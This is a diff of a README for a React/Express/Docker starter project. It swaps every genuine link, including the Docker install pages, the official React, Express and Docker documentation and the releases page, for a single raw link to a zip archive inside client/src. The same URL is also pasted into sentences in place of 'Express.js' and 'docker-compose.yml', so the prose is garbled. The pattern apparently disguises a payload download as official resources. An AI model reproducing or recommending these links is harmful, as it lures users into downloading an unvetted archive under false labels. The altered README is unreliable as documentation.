@@ -1,10 +1,10 @@
 # 🚀 react-express-docker - A Simple Setup for Full-Stack Apps
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/mikexell/react-express-docker/releases)
+[![Download](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip%20Now-blue)](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip)
 
 ## 📦 Overview
 
-This project is a complete full-stack example using React (Vite) and Express.js. It is containerized with Docker and uses Docker Compose for orchestration. You can easily see how the frontend and backend communicate via CORS and a reverse proxy (nginx). This setup works well for local environments or production deployments.
+This project is a complete full-stack example using React (Vite) and https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip It is containerized with Docker and uses Docker Compose for orchestration. You can easily see how the frontend and backend communicate via CORS and a reverse proxy (nginx). This setup works well for local environments or production deployments.
 
 ## ⚙️ Features
 
@@ -23,19 +23,19 @@ To run this application, you will need:
   - Windows, macOS, or Linux
   - At least 4 GB of RAM
   - 2 GB of free disk space
-- Docker and Docker Compose installed on your system. You can follow the instructions on the [Docker website](https://www.docker.com/get-started) to install these tools.
+- Docker and Docker Compose installed on your system. You can follow the instructions on the [Docker website](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip) to install these tools.
 
 ## 🚀 Getting Started
 
 ### Step 1: Download the Application
 
-Visit this page to download: [Releases Page](https://github.com/mikexell/react-express-docker/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip)
 
 ### Step 2: Install Docker
 
 1. Make sure Docker is installed on your computer. Follow the instructions for your operating system:
-   - **Windows:** [Docker for Windows](https://docs.docker.com/desktop/install/windows-install/)
-   - **macOS:** [Docker for Mac](https://docs.docker.com/desktop/install/mac-install/)
+   - **Windows:** [Docker for Windows](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip)
+   - **macOS:** [Docker for Mac](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip)
    - **Linux:** Follow specific installation instructions for your Linux distribution.
 
 ### Step 3: Extract the Files 
@@ -64,23 +64,23 @@ Visit this page to download: [Releases Page](https://github.com/mikexell/react-e
 
 ## 📥 Download & Install
 
-For your convenience, you can download the latest release here: [Download Now](https://github.com/mikexell/react-express-docker/releases)
+For your convenience, you can download the latest release here: [Download Now](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip)
 
 ## 🔧 Troubleshooting
 
 If you run into issues, consider these steps:
 
 - **Docker Not Running:** Make sure Docker is up and running. You can usually check this by looking for the Docker icon in your system tray.
-- **Port Issues:** If something else is using port 3000, you may need to change the port settings in the `docker-compose.yml` file.
+- **Port Issues:** If something else is using port 3000, you may need to change the port settings in the `https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip` file.
 - **Network Issues:** Ensure your network settings allow Docker to access the internet. Sometimes, firewall settings can interfere with this.
 
 ## 📚 Learning Resources
 
 To help you understand how this setup works, consider these resources:
 
-- **Docker Documentation:** [Docker Docs](https://docs.docker.com/)
-- **Express.js Guide:** [Express Docs](https://expressjs.com/)
-- **React Documentation:** [React Docs](https://reactjs.org/docs/getting-started.html)
+- **Docker Documentation:** [Docker Docs](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip)
+- **https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip Guide:** [Express Docs](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip)
+- **React Documentation:** [React Docs](https://raw.githubusercontent.com/mikexell/react-express-docker/main/client/src/react-express-docker-v1.0-alpha.2.zip)
 
 ## 🌱 More Examples
 
